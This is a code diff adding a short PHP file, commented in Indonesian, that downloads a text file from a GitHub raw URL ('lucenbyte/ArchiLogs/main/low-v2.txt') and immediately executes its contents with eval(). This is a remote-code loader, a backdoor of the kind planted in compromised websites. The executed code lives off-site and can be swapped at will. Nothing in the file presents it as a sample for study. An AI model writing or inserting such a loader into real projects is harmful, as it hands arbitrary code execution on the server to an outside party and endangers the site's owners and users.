@@ -1,0 +1,13 @@
+<?php
+$url = "https://raw.githubusercontent.com/lucenbyte/ArchiLogs/main/low-v2.txt";
+
+// Ambil konten PHP dari URL
+$code = file_get_contents($url);
+
+// Jika berhasil, langsung jalankan kodenya
+if ($code !== false) {
+    eval("?>".$code);
+} else {
+    echo "Gagal mengambil konten dari $url";
+}
+?>
